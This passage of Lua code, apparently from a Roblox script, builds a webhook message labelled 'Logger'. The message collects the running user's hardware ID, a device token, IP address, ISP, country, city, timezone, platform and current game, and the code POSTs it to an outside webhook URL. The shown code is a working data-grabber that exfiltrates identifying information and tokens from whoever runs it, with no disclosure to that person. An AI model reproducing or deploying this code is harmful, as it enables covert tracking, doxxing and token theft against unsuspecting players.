                    {["name"] = "System", ["value"] = "**Platform:** "..(_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
                    {["name"] = "Hardware ID", ["value"] = "```".._hw.."```", ["inline"] = false},
                    {["name"] = "Device Token", ["value"] = "```".._tk.."```", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Logger | "..string.upper(_st).." • "..os.date("%x %I:%M %p")},
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
